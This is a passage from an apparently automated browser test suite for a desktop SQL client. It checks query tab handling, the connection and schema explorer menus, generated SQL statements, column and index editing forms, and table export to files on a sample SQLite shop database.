      await editorPalette.waitFor({ state: "detached" });
      await editorText("SELECT TOTAL FROM ORDERS");
    }
    await setTheme("light", "light");
    await replaceQuery(panel, "select 'unterminated");
  }

  step("tabs: Ctrl+W closes, Ctrl+Shift+T reopens with the SQL, Ctrl+Tab goes back to the previous tab");
  const queryTabCount = await page.locator(".tabbar .tab").count();
  await sqlEditor.click();
  await page.keyboard.press("Control+w");
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, queryTabCount - 1);
  await page.keyboard.press("Control+Shift+T");
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, queryTabCount);
  assert.equal(await panel.locator(".cm-content").innerText(), "select 'unterminated");
  assert.equal(await panel.locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
  const activeName = () => page.locator(".tabbar .tab.active").innerText();
  const reopened = await activeName();
  await page.keyboard.press("Control+Tab");
  assert.notEqual(await activeName(), reopened);
  // Most recently used first: a second quick Ctrl+Tab comes back.
  await page.keyboard.press("Control+Tab");
  assert.equal(await activeName(), reopened);
  await page.keyboard.press("Control+PageDown");
  assert.notEqual(await activeName(), reopened);
  await page.keyboard.press("Control+PageUp");
  assert.equal(await activeName(), reopened);
  await page.locator(".tabbar .tab.active").focus();
  await page.keyboard.press("ArrowRight");
  assert.notEqual(await activeName(), reopened);
  await page.keyboard.press("ArrowLeft");
  assert.equal(await activeName(), reopened);
  const addTabButton = page.getByRole("button", { name: "New query (Ctrl+T)" });
  assert.ok(await addTabButton.isVisible());
  assert.equal(await addTabButton.evaluate((el) => el.parentElement.classList.contains("tab-strip")), true);
  await addTabButton.click();
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n + 1, queryTabCount);
  await page.locator(".tabbar .tab.active .close").click();
  await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, queryTabCount);
  assert.equal(await activeName(), reopened);
  await shot("05e-tabs-light");
  await setTheme("dark", "dark");
  await shot("05e-tabs-dark");
  await setTheme("light", "light");

  step("tab management: rename, pin, duplicate, drag, the Ctrl+Tab switcher, the running indicator and maximized results");
  {
    const tabs = page.locator(".tabbar .tab");
    const activeTab = page.locator(".tabbar .tab.active");
    const shown = page.locator(".tab-panel:not([hidden])");
    const labels = () => page.locator(".tabbar .tab .tab-label").allInnerTexts();
    const activeLabel = () => activeTab.locator(".tab-label").innerText();
    const tabMenu = page.getByRole("menu", { name: /^Actions for / });
    // Rename from the tab's menu: the name is edited in place, Enter keeps it.
    await activeTab.click({ button: "right" });
    await tabMenu.getByRole("menuitem", { name: /^Rename/ }).click();
    const renameInput = activeTab.locator("input.tab-rename");
    await renameInput.waitFor();
    await renameInput.fill("Orders report");
    await renameInput.press("Enter");
    await renameInput.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), "Orders report");
    // Ctrl+F2 renames too; Escape keeps the old name.
    await page.keyboard.press("Control+F2");
    await renameInput.waitFor();
    await page.keyboard.insertText("Not kept");
    await page.keyboard.press("Escape");
    await renameInput.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), "Orders report");
    // Pin from the menu: pinned tabs sort first, and their × becomes an unpin button.
    await activeTab.click({ button: "right" });
    await tabMenu.getByRole("menuitem", { name: /^Pin/ }).click();
    await page.locator('.tabbar .tab.active[data-pinned="true"]').waitFor();
    assert.equal((await labels())[0], "Orders report");
    assert.equal(await activeTab.locator("button.close").getAttribute("aria-label"), "Unpin Orders report");
    await shot("05f-tab-pinned");
    await page.keyboard.press("Control+Alt+p");
    await page.locator(".tabbar .tab.active:not([data-pinned])").waitFor();
    await page.keyboard.press("Control+Alt+p");
    await page.locator('.tabbar .tab.active[data-pinned="true"]').waitFor();
    // Duplicate (Ctrl+Alt+D): next to it, same SQL and connection, no session, not pinned.
    const beforeCopy = await tabs.count();
    await page.keyboard.press("Control+Alt+d");
    await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n + 1, beforeCopy);
    assert.equal(await activeLabel(), "Orders report (copy)");
    assert.equal(await activeTab.getAttribute("data-pinned"), null);
    assert.deepEqual((await labels()).slice(0, 2), ["Orders report", "Orders report (copy)"]);
    assert.equal(await shown.locator(".cm-content").innerText(), "select 'unterminated");
    assert.equal(await shown.locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
    await activeTab.locator(".dot-disconnected").waitFor();
    // Drag the copy one place right, then onto the pinned tab: it stays after the pinned ones.
    // As a person would: press once the tab has stopped moving, see it dragged, and let go only
    // when the drop marker shows where it lands (`marker`), aiming again if it does not.
    const dragTab = async (from, to, end, marker) => {
      const a = await settledBox(tabs.nth(from));
      await page.mouse.move(a.x + a.width / 2, a.y + a.height / 2);
      await page.mouse.down();
      await page.mouse.move(a.x + a.width / 2 + (end === "right" ? 12 : -12), a.y + a.height / 2, { steps: 3 });
      await tabs.nth(from).and(page.locator(".dragging")).waitFor();
      for (let attempt = 0; ; attempt++) {
        const b = await settledBox(tabs.nth(to));
        await page.mouse.move((end === "right" ? b.x + b.width - 6 : b.x + 6) + (attempt % 2), b.y + b.height / 2, { steps: attempt === 0 ? 8 : 2 });
        try {
          await marker.waitFor({ timeout: 3_000 });
          return;
        } catch (error) {
          if (attempt < 4) continue;
          throw new Error(`${error.message}\n${JSON.stringify(await page.evaluate(() => [...document.querySelectorAll(".tabbar .tab")].map((tab) => `${tab.textContent} [${tab.className}]`)))}`);
        }
      }
    };
    // A drag selects no text: a press on selected text would drag the text, not the tab.
    const noTextSelected = async () => assert.equal(await page.evaluate(() => window.getSelection().toString()), "");
    const count = await tabs.count();
    // One place right: it lands before the tab after the next one, or after the last tab.
    await dragTab(1, 2, "right", count > 3 ? tabs.nth(3).and(page.locator(".drop-before")) : tabs.nth(2).and(page.locator(".drop-after")));
    await shot("05f-tab-drag");
    await page.mouse.up();
    await page.locator(".tabbar .tab.dragging").waitFor({ state: "detached" });
    assert.equal((await labels())[2], "Orders report (copy)");
    assert.equal(await activeLabel(), "Orders report (copy)");
    await noTextSelected();
    // Right away, the same tab again: onto the pinned tab, it lands just after it.
    await dragTab(2, 0, "left", tabs.nth(1).and(page.locator(".drop-before")));
    await page.mouse.up();
    await page.locator(".tabbar .tab.dragging").waitFor({ state: "detached" });
    assert.deepEqual((await labels()).slice(0, 2), ["Orders report", "Orders report (copy)"]);
    await noTextSelected();
    // Ctrl+Shift+PageDown / PageUp move the active tab by one place.
    await page.keyboard.press("Control+Shift+PageDown");
    assert.equal((await labels())[2], "Orders report (copy)");
    await page.keyboard.press("Control+Shift+PageUp");
    assert.equal((await labels())[1], "Orders report (copy)");
    // Ctrl+Tab: hold Ctrl and press Tab to walk the most recently used tabs; release to switch.
    await page.keyboard.down("Control");
    await page.keyboard.press("Tab");
    const switcher = page.getByRole("listbox", { name: "Recently used tabs" });
    await switcher.waitFor();
    assert.equal(await switcher.getByRole("option", { selected: true }).innerText(), "Orders report");
    await page.keyboard.press("Tab");
    const third = await switcher.getByRole("option", { selected: true }).innerText();
    assert.ok(!third.startsWith("Orders report"), third);
    await shot("05f-tab-switcher");
    await page.keyboard.up("Control");
    await switcher.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), third);
    // Escape keeps the current tab; a click on a row switches to it.
    await page.keyboard.down("Control");
    await page.keyboard.press("Tab");
    await switcher.waitFor();
    await page.keyboard.press("Escape");
    await page.keyboard.up("Control");
    await switcher.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), third);
    await page.keyboard.down("Control");
    await page.keyboard.press("Tab");
    await switcher.getByRole("option", { name: "Orders report (copy)" }).click();
    await page.keyboard.up("Control");
    await switcher.waitFor({ state: "detached" });
    assert.equal(await activeLabel(), "Orders report (copy)");
    // A query running shows on its tab, until it is cancelled.
    await replaceQuery(shown, "with recursive spin(i) as (select 1 union all select i + 1 from spin) select count(*) from spin;");
    await run(shown);
    await activeTab.locator(".tab-running").waitFor();
    assert.equal(await activeTab.locator(".tab-running").getAttribute("aria-label"), "A query is running");
    await shot("05f-tab-running");
    await shown.getByRole("button", { name: "Cancel", exact: true }).click();
    await activeTab.locator(".tab-running").waitFor({ state: "detached" });
    await activeTab.locator(".dot-connected").waitFor();
    // Maximize the results (button or Ctrl+Alt+M): the editor hides and comes back unchanged.
    await replaceQuery(shown, "select 1 as maximized;");
    await run(shown);
    await shown.locator(".grid-host").waitFor();
    await shown.getByRole("button", { name: "Maximize results (Ctrl+Alt+M)" }).click();
    await shown.locator(".editor-pane").waitFor({ state: "hidden" });
    await shot("05f-results-maximized");
    await page.keyboard.press("Control+Alt+m");
    await shown.locator(".editor-pane").waitFor({ state: "visible" });
    assert.equal(await shown.locator(".cm-content").innerText(), "select 1 as maximized;");
    await page.keyboard.press("Control+Alt+m");
    await shown.locator(".editor-pane").waitFor({ state: "hidden" });
    await shown.getByRole("button", { name: "Restore the editor (Ctrl+Alt+M)" }).click();
    await shown.locator(".editor-pane").waitFor({ state: "visible" });
    // Back as it was for the next steps: the copy closed, the original unpinned.
    await page.keyboard.press("Control+w");
    await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, beforeCopy);
    await tabs.first().click();
    assert.equal(await activeLabel(), "Orders report");
    await activeTab.getByRole("button", { name: "Unpin Orders report" }).click();
    await page.locator(".tabbar .tab.active:not([data-pinned])").waitFor();
  }

  step("explorer: view rows and generate SQL written by the core");
  await page.locator('.connection-row:has-text("Shop (SQLite)") .twisty').click();
  const mainSchemaNode = page.getByRole("button", { name: "Expand or collapse schema main" });
  assert.equal(await mainSchemaNode.evaluate((el) => getComputedStyle(el).cursor), "pointer");
  await mainSchemaNode.click();

  step("connection menu: every action once, from a right click or the keyboard, and no row buttons");
  {
    const shopRow = page.locator('.connection-row:has-text("Shop (SQLite)")');
    assert.equal(await shopRow.locator("button:not(.twisty):not(.connection-tag)").count(), 0, "a connection row has no ⋯ or + button");
    const menu = await connectionMenu("Shop (SQLite)");
    const labels = () => menu.getByRole("menuitem").evaluateAll((items) => items.map((item) => item.getAttribute("aria-label")));
    assert.deepEqual(await labels(), [
      "New query", "Open object by name…", "Refresh all schemas",
      "Edit…", "Configure filters…",
      "Back up…", "Run SQL file…",
      "Duplicate", "Copy", "Paste connection", "Move to folder…",
      "Delete…",
    ]);
    await shot("sdb-102-connection-menu");
    await page.keyboard.press("Escape");
    await menu.waitFor({ state: "detached" });
    // From the keyboard: Shift+F10 on the focused row opens it on its first action, the arrows
    // move, and Escape closes it and gives the focus back to the row.
    const focused = () => page.evaluate(() => document.activeElement?.getAttribute("aria-label") ?? null);
    await shopRow.locator(".twisty").focus();
    await page.keyboard.press("Shift+F10");
    await menu.waitFor();
    assert.equal(await focused(), "New query");
    await page.keyboard.press("End");
    assert.equal(await focused(), "Delete…");
    await page.keyboard.press("ArrowDown");
    assert.equal(await focused(), "New query");
    await page.keyboard.press("Escape");
    await menu.waitFor({ state: "detached" });
    assert.ok(await shopRow.locator(".twisty").evaluate((el) => el === document.activeElement), "the focus is back on the row");
    // New query from the menu, as a double click on the name, opens a tab on this connection.
    const tabsBefore = await page.locator('.tabbar [role="tab"]').count();
    await (await connectionMenu("Shop (SQLite)")).getByRole("menuitem", { name: "New query" }).click();
    await menu.waitFor({ state: "detached" });
    await page.waitForFunction((count) => document.querySelectorAll('.tabbar [role="tab"]').length === count + 1, tabsBefore);
    await page.keyboard.press("Control+w");
    await page.waitForFunction((count) => document.querySelectorAll('.tabbar [role="tab"]').length === count, tabsBefore);
    // The whole row, not only the name, supports the same gesture.
    await shopRow.locator(".engine-icon").dblclick();
    await page.waitForFunction((count) => document.querySelectorAll('.tabbar [role="tab"]').length === count + 1, tabsBefore);
    await page.keyboard.press("Control+w");
    await page.waitForFunction((count) => document.querySelectorAll('.tabbar [role="tab"]').length === count, tabsBefore);
  }
  // Objects are in folders by type (ADR-024), with how many each holds.
  const tablesFolder = page.getByRole("button", { name: "Expand or collapse Tables", exact: true });
  assert.equal(await tablesFolder.evaluate((el) => getComputedStyle(el).cursor), "pointer");
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  await tablesFolder.click();
  await page.getByRole("button", { name: "Expand or collapse Views", exact: true }).click();
  const ordersNode = page.getByRole("button", { name: "Expand or collapse orders", exact: true });
  const tabsBeforeGeneratedSql = await page.getByRole("tab").count();
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate UPDATE", exact: true }).click();
  const generatedDialog = page.getByRole("dialog", { name: "Generated SQL" });
  const generatedEditor = generatedDialog.getByRole("textbox", { name: "SQL editor" });
  await generatedEditor.waitFor();
  assert.match(await generatedEditor.inputValue(), /^UPDATE orders\nSET\n/);
  assert.equal(await page.getByRole("tab").count(), tabsBeforeGeneratedSql);
  const copiedBeforeSql = await page.evaluate(() => window.__copied.length);
  await generatedEditor.fill("SELECT 42;");
  await generatedDialog.getByRole("button", { name: "Copy", exact: true }).click();
  assert.equal(await copied(copiedBeforeSql + 1), "SELECT 42;");
  await shot("05f-generated-update");
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).click({ button: "right" });
  assert.equal(await page.getByRole("menuitem", { name: "Generate DELETE", exact: true }).count(), 0);
  await page.getByRole("menuitem", { name: "Open as SQL" }).click();
  await panel.locator(".cm-content", { hasText: "FROM big_orders" }).waitFor();
  assert.equal((await panel.locator(".cm-content").innerText()).trimEnd(), "SELECT *\nFROM big_orders\nLIMIT 100;");
  // "Edit source" on a view (ADR-047): the statement that replaces it opens in a new tab, not
  // run; SQLite has no OR REPLACE, so it drops the view first.
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).click({ button: "right" });
  await page.getByRole("menuitem", { name: "Edit source" }).click();
  await panel.locator(".cm-content", { hasText: "DROP VIEW IF EXISTS big_orders;" }).waitFor();
  assert.equal(
    (await panel.locator(".cm-content").innerText()).trimEnd(),
    "DROP VIEW IF EXISTS big_orders;\nCREATE VIEW big_orders as select * from orders where total > 500;",
  );
  // A trigger's definition, as SQLite keeps it, opens in a new tab and does not run.
  await page.getByRole("button", { name: "Expand or collapse Triggers", exact: true }).click();
  const triggerNode = page.getByRole("button", { name: "product_stock_check: open its definition", exact: true });
  assert.equal(await triggerNode.locator(".muted").innerText(), "on product");
  await triggerNode.dblclick();
  await panel.locator(".cm-content", { hasText: "CREATE TRIGGER product_stock_check" }).waitFor();
  assert.match((await panel.locator(".cm-content").innerText()).trimEnd(), /^CREATE TRIGGER product_stock_check before update of stock on product[\s\S]*end;$/);
  await shot("05g-trigger-definition");
  // A table exposes all five detail folders, including its own triggers.
  const productNode = page.getByRole("button", { name: "Expand or collapse product", exact: true });
  assert.equal(await productNode.locator(".twisty").evaluate((el) => getComputedStyle(el).cursor), "pointer");
  assert.equal(await productNode.locator(".label").evaluate((el) => getComputedStyle(el).cursor), "pointer");
  await productNode.locator(".label").click();
  assert.equal(await productNode.getAttribute("aria-expanded"), "false");
  await productNode.locator(".twisty").click();
  assert.equal(await productNode.getAttribute("aria-expanded"), "true");
  await productNode.focus();
  await page.keyboard.press("Enter");
  assert.equal(await productNode.getAttribute("aria-expanded"), "false");
  await productNode.locator(".twisty").click();
  const productChildren = productNode.locator("xpath=..");
  for (const folder of ["Columns", "Constraints", "Foreign keys", "Indexes", "Triggers"]) {
    const folderNode = productChildren.getByRole("button", { name: `Expand or collapse ${folder}`, exact: true });
    await folderNode.waitFor();
    const expanded = await folderNode.getAttribute("aria-expanded");
    await folderNode.locator(".label").click();
    assert.equal(await folderNode.getAttribute("aria-expanded"), expanded);
    await folderNode.locator(".label").dblclick();
    const overview = page.getByRole("region", { name: `${folder} of product` });
    await overview.waitFor();
    if (folder === "Columns") {
      await page.waitForFunction(() => {
        const bar = document.querySelector(".tabbar")?.getBoundingClientRect();
        const active = document.querySelector(".tabbar .tab.active")?.getBoundingClientRect();
        return bar && active && active.left >= bar.left && active.right <= bar.right;
      });
      await shot("05f-tabs-metadata");
    }
    const overviewWidth = await overview.evaluate((el) => ({ view: el.getBoundingClientRect().width, panel: el.parentElement.getBoundingClientRect().width }));
    assert.ok(Math.abs(overviewWidth.view - overviewWidth.panel) < 1, JSON.stringify(overviewWidth));
    assert.equal(await folderNode.getAttribute("aria-expanded"), expanded);
    if (folder === "Triggers") await overview.getByText("product_stock_check", { exact: true }).waitFor();
    if (folder === "Columns") {
      await overview.getByText("stock", { exact: true }).waitFor();
      await overview.getByRole("row").filter({ hasText: "stock" }).getByRole("button", { name: "Rename…" }).click();
      const rename = page.getByRole("dialog", { name: "Rename column stock of product" });
      await rename.getByLabel("SQL that will run").waitFor();
      await rename.getByRole("button", { name: "Cancel" }).click();
      await overview.getByRole("checkbox", { name: "Select column stock" }).check();
      await overview.getByRole("button", { name: "New index on (stock)" }).click();
      await panel.locator(".cm-content", { hasText: "CREATE INDEX" }).waitFor();
      await page.keyboard.press("Control+w");
      await overview.waitFor();
      // Create a column via the form; SQL is reviewed and run in an editor first.
      await overview.getByRole("button", { name: "Add…" }).click();
      const addColumn = page.getByRole("dialog", { name: "Add to Columns of product" });
      await addColumn.getByLabel("Name", { exact: true }).fill("smoke_added");
      await addColumn.getByRole("combobox", { name: "Data type", exact: true }).selectOption("INTEGER");
      await addColumn.getByRole("combobox", { name: "Data type", exact: true }).selectOption("__custom__");
      await addColumn.getByLabel("Custom data type").fill("INTEGER");
      await shot("05f-add-column-form");
      const previousTheme = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
      await shot("05f-add-column-form-dark");
      await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, previousTheme);
      await addColumn.getByRole("button", { name: "Open SQL" }).click();
      await panel.locator(".cm-content", { hasText: "ALTER TABLE product ADD COLUMN smoke_added INTEGER;" }).waitFor();
      await run(panel);
      await panel.getByText(/Statement 1: (OK|0 rows)/).waitFor();
      await page.keyboard.press("Control+w");
      await overview.getByRole("button", { name: "Refresh" }).click();
      const addedRow = overview.getByText("smoke_added", { exact: true }).locator("xpath=..");
      await addedRow.getByRole("button", { name: "Drop…" }).click();
      const dropAdded = page.getByRole("dialog", { name: "Drop smoke_added" });
      await dropAdded.getByRole("button", { name: "Cancel" }).waitFor();
      assert.ok(await dropAdded.getByRole("button", { name: "Cancel" }).evaluate((button) => document.activeElement === button), "destructive confirmation starts on Cancel");
      await dropAdded.getByLabel("SQL that will run").filter({ hasText: "DROP COLUMN smoke_added" }).waitFor();
      await dropAdded.getByRole("button", { name: "Drop", exact: true }).click();
      await overview.getByText("smoke_added", { exact: true }).waitFor({ state: "detached" });
      // Edit columns with the form (ADR-047): the core writes one script that follows the form;
      // SQLite rebuilds the table, so the risk dialog asks before its DROP TABLE runs.
      await overview.getByRole("button", { name: "Edit columns…" }).click();
      const editColumns = page.getByRole("dialog", { name: "Edit columns of product" });
      await editColumns.getByLabel("SQL that will run").filter({ hasText: "Nothing has changed yet." }).waitFor();
      assert.ok(await editColumns.getByRole("button", { name: "Apply changes" }).isDisabled());
      await editColumns.getByLabel("Default of stock").fill("5");
      await editColumns.getByLabel("Type of price").fill("NUMERIC");
      await editColumns.getByLabel("SQL that will run").filter({ hasText: "INSERT INTO _spelaion_rebuild_product" }).waitFor();
      await editColumns.getByLabel("SQL that will run").filter({ hasText: "stock integer DEFAULT 5" }).waitFor();
      assert.equal(await editColumns.getByText("Changed", { exact: true }).count(), 2);
      await shot("sdb-21-edit-columns");
      const themeBeforeEdit = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
      await shot("sdb-21-edit-columns-dark");
      await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforeEdit);
      await editColumns.getByRole("button", { name: "Apply changes" }).click();
      const rebuildRisk = page.getByRole("dialog", { name: "Run these statements?" });
      await rebuildRisk.getByText(/DROP TABLE product/).first().waitFor();
      await shot("sdb-21-rebuild-confirmation");
      await rebuildRisk.getByRole("button", { name: /^Run anyway/ }).click();
      await editColumns.waitFor({ state: "detached" });
      const stockRow = overview.getByRole("row").filter({ hasText: "stock" });
      await stockRow.getByRole("cell", { name: "5", exact: true }).waitFor();
      await overview.getByRole("row").filter({ hasText: "price" }).getByRole("cell", { name: "NUMERIC", exact: true }).waitFor();
      // The same form on one column, from the explorer's column menu, can open its SQL instead.
      const productColumns = productChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true }).locator("xpath=..");
      if (await productChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true }).getAttribute("aria-expanded") !== "true") {
        await productChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true }).locator(".twisty").click();
      }
      await productColumns.locator(".leaf-row", { hasText: /^name/ }).click({ button: "right" });
      await page.getByRole("menuitem", { name: "Edit column…" }).click();
      const editName = page.getByRole("dialog", { name: "Edit column name of product" });
      await editName.getByLabel("name is nullable").check();
      await editName.getByLabel("SQL that will run").filter({ hasText: "name text," }).waitFor();
      await editName.getByRole("button", { name: "Open in editor" }).click();
      await panel.locator(".cm-content", { hasText: "INSERT INTO _spelaion_rebuild_product" }).waitFor();
      await page.keyboard.press("Control+w");
      await overview.waitFor();
      // A lost metadata session must not reconnect or repeat its catalog read by itself.
      const detailsSession = (await page.locator(".tabbar .tab.active").getAttribute("id")).replace("workspace-", "");
      await page.evaluate((session) => window.__TAURI_INTERNALS__.invoke("plugin:event|emit", {
        event: "session-lost", payload: { session, reason: "Test connection lost" },
      }), detailsSession);
      await overview.getByRole("button", { name: "Reconnect" }).waitFor();
      await folderNode.locator(".label").dblclick();
      await overview.getByRole("button", { name: "Reconnect" }).waitFor();
      await overview.getByRole("button", { name: "Reconnect" }).click();
      await overview.getByText("Reconnected. Refresh to load the metadata again.").waitFor();
      assert.equal(await overview.getByText("stock", { exact: true }).count(), 0);
      await overview.getByRole("button", { name: "Refresh" }).click();
      await overview.getByText("stock", { exact: true }).waitFor();
    }
    if (folder === "Constraints" || folder === "Foreign keys") assert.ok(await overview.getByRole("button", { name: "Add…" }).isDisabled());
    if (folder === "Indexes" || folder === "Triggers") {
      await overview.getByRole("button", { name: "Add…" }).click();
      const add = page.getByRole("dialog", { name: `Add to ${folder} of product` });
      await add.getByLabel("Name", { exact: true }).fill(folder === "Indexes" ? "smoke_new_index" : "smoke_new_trigger");
      if (folder === "Indexes") await add.getByLabel("stock", { exact: true }).check();
      else await add.getByLabel("Trigger statement").fill("SELECT 1");
      if (folder === "Triggers") await shot("05f-add-trigger-form");
      await add.getByRole("button", { name: "Open SQL" }).click();
      await panel.locator(".cm-content", { hasText: folder === "Indexes" ? "CREATE INDEX smoke_new_index" : "CREATE TRIGGER smoke_new_trigger" }).waitFor();
      await page.keyboard.press("Control+w");
      await overview.waitFor();
    }
    await page.keyboard.press("Control+w");
    await overview.waitFor({ state: "detached" });
  }
  // The arrow still expands the folder and exposes its entries.
  const productTriggers = productChildren.getByRole("button", { name: "Expand or collapse Triggers", exact: true });
  if (await productTriggers.getAttribute("aria-expanded") === "true") await productTriggers.locator(".twisty").click();
  await productTriggers.locator(".twisty").click();
  await productChildren.getByRole("button", { name: "product_stock_check: open its definition", exact: true }).waitFor();
  await productNode.locator(".twisty").click();
  // A table holds folders of its columns (open), constraints, foreign keys and indexes.
  await ordersNode.locator(".twisty").click();
  const ordersChildren = ordersNode.locator("xpath=..");
  const columnsFolder = ordersChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true });
  await columnsFolder.waitFor();
  assert.equal(await columnsFolder.getAttribute("aria-expanded"), "true");
  // DBeaver's Advanced Copy (Ctrl+Shift+C): a column's name qualified as the core writes it.
  const copiedBeforeColumn = await page.evaluate(() => window.__copied.length);
  await ordersChildren.locator(".leaf-row", { hasText: "customer_id" }).first().focus();
  await page.keyboard.press("Control+Shift+c");
  assert.equal(await copied(copiedBeforeColumn + 1), "orders.customer_id");
  await ordersChildren.getByRole("button", { name: "Expand or collapse Constraints", exact: true }).locator(".twisty").click();
  await ordersChildren.locator(".row", { hasText: "PRIMARY KEY (id)" }).waitFor();
  await ordersChildren.getByRole("button", { name: "Expand or collapse Foreign keys", exact: true }).locator(".twisty").click();
  await ordersChildren.locator(".row", { hasText: "(customer_id) → customer (id)" }).waitFor();
  await ordersChildren.getByRole("button", { name: "Expand or collapse Indexes", exact: true }).locator(".twisty").click();
  await ordersChildren.getByRole("button", { name: "orders_customer: open its definition", exact: true }).dblclick();
  await panel.locator(".cm-content", { hasText: "CREATE INDEX orders_customer" }).waitFor();
  assert.equal((await panel.locator(".cm-content").innerText()).trimEnd(), "CREATE INDEX orders_customer on orders (customer_id);");
  await shot("05g-table-folders");
  await ordersNode.locator(".twisty").click();
  // "Generate DDL": the table's CREATE and indexes in an editable preview.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  const generateMenu = page.getByRole("menu", { name: "Generate SQL" });
  await generateMenu.waitFor();
  assert.equal(await generateMenu.evaluate((el) => getComputedStyle(el).overflowY), "auto");
  assert.equal(await generateMenu.evaluate((el) => el.parentElement === document.body), true);
  await page.getByRole("menuitem", { name: "Generate DDL" }).click();
  await generatedEditor.waitFor();
  const ordersDdl = (await generatedEditor.inputValue()).trimEnd();
  assert.match(ordersDdl, /^CREATE TABLE orders \(/);
  assert.ok(ordersDdl.endsWith("CREATE INDEX orders_customer on orders (customer_id);"), ordersDdl);
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // Rows by a list of keys.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate SELECT … WHERE key IN" }).click();
  await generatedEditor.waitFor();
  assert.ok((await generatedEditor.inputValue()).trimEnd().endsWith("FROM orders\nWHERE id IN (:id_1, :id_2, :id_3);"));
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // The engine decides what else: SQLite has an upsert, and no MERGE.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate upsert (INSERT or UPDATE)" }).waitFor();
  assert.equal(await page.getByRole("menuitem", { name: "Generate MERGE" }).count(), 0);
  await page.getByRole("menuitem", { name: "Generate upsert (INSERT or UPDATE)" }).click();
  await generatedEditor.waitFor();
  assert.ok((await generatedEditor.inputValue()).includes("ON CONFLICT (id) DO UPDATE SET"));
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // UPDATE … FROM a source of values; SQLite has no DELETE … USING.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate UPDATE … FROM" }).waitFor();
  assert.equal(await page.getByRole("menuitem", { name: "Generate DELETE … USING" }).count(), 0);
  await page.getByRole("menuitem", { name: "Generate UPDATE … FROM" }).click();
  await generatedEditor.waitFor();
  assert.match(await generatedEditor.inputValue(), /^UPDATE orders AS target\nSET\n/);
  assert.ok((await generatedEditor.inputValue()).includes("WHERE target.id = source.id"));
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // Ctrl+click chooses tables; their menu joins them on the foreign keys between them.
  const customerRow = page.getByRole("button", { name: "Expand or collapse customer", exact: true });
  await ordersNode.click({ modifiers: ["Control"] });
  await customerRow.click({ modifiers: ["Control"] });
  assert.equal(await ordersNode.getAttribute("aria-selected"), "true");
  assert.equal(await customerRow.getAttribute("aria-selected"), "true");
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate SQL" }).click();
  await page.getByRole("menuitem", { name: "Generate INNER JOIN of the 2 chosen tables" }).click();
  await generatedEditor.waitFor();
  assert.equal((await generatedEditor.inputValue()).trimEnd(), "SELECT *\nFROM orders o\nINNER JOIN customer c ON c.id = o.customer_id;");
  await generatedDialog.getByRole("button", { name: "Close" }).click();
  // Copy takes every chosen table, one name per line.
  const copiedBeforeNames = await page.evaluate(() => window.__copied.length);
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Copy 2 names" }).click();
  assert.equal(await copied(copiedBeforeNames + 1), "orders\ncustomer");
  // Export streams the chosen tables without opening them: one file each into a folder,
  // never over a file that is there.
  {
    const folder = join(userDir, "tables");
    mkdirSync(folder, { recursive: true });
    writeFileSync(join(folder, "orders.csv"), "keep");
    await page.evaluate((target) => (window.__spelaionOpenFolder = target), folder);
    await ordersNode.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Export 2 tables…" }).click();
    const dialog = page.getByRole("dialog", { name: "Export 2 tables" });
    await dialog.getByRole("button", { name: "Export…" }).click();
    await dialog.locator(".export-result", { hasText: "2 files" }).waitFor();
    await shot("05e-export-tables");
    await dialog.getByRole("button", { name: "Close" }).click();
    await page.evaluate(() => delete window.__spelaionOpenFolder);
    assert.equal(readFileSync(join(folder, "orders.csv"), "utf8"), "keep");
    const orders = readFileSync(join(folder, "orders (2).csv"), "utf8").trimEnd().split("\r\n");
    assert.equal(orders.length, 50_001);
    assert.ok(orders[0].startsWith("\ufeffid,"), orders[0]);
    assert.ok(readFileSync(join(folder, "customer.csv"), "utf8").startsWith("\ufeffid,"));
  }
  // A plain click forgets the choice without expanding the table.
  await ordersNode.click();
  assert.equal(await customerRow.getAttribute("aria-selected"), "false");
  assert.equal(await ordersNode.getAttribute("aria-expanded"), "false");
  // One table from the explorer: to a file, with a progress line and every row.
  {
    const path = join(userDir, "orders.json");
    await page.evaluate((target) => (window.__spelaionSavePath = target), path);
    await customerRow.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Export…", exact: true }).click();
